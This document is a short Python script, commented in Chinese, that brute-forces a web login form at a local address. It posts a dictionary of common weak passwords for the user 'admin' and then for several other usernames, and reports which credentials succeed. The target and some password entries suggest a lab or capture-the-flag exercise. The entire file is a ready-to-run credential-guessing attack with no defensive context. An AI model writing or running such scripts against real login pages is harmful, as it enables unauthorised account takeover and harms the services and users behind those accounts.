import requests

target_url = "http://127.0.0.1:5000/login"

# 密码字典（常见弱密码和可能的目标口令）
passwords = [
    "admin", "admin123", "admin123456", "password", "123456",
    "12345678", "123456789", "qwerty", "abc123", "letmein",
    "welcome", "monkey", "dragon", "master", "sunshine",
    "princess", "football", "iloveyou", "trustno1", "passw0rd",
    "alice2025", "alice", "root", "test", "guest",
    "administrator", "admin2023", "admin2024", "admin2025",
    "a123456", "Aa123456", "111111", "000000", "pass",
]

username = "admin"
found = False

with requests.Session() as sess:
    for pwd in passwords:
        data = {"username": username, "password": pwd}
        r = sess.post(target_url, data=data, allow_redirects=False)

        # 登录成功后会重定向或在响应中包含用户信息特征
        if r.status_code == 200 and "欢迎" in r.text:
            print(f"[+] 破解成功！用户名: {username}  密码: {pwd}")
            found = True
            break
        else:
            print(f"[-] 尝试 {username}:{pwd} 失败")

    if not found:
        print(f"\n[-] 未找到 {username} 的有效密码，尝试其它用户...")

        # 换个用户名继续
        for user in ["alice", "root", "test"]:
            for pwd in passwords:
                data = {"username": user, "password": pwd}
                r = sess.post(target_url, data=data, allow_redirects=False)
                if r.status_code == 200 and "欢迎" in r.text:
                    print(f"[+] 破解成功！用户名: {user}  密码: {pwd}")
                    found = True
                    break
            if found:
                break

    if not found:
        print("[-] 爆破结束，未找到有效凭证。")
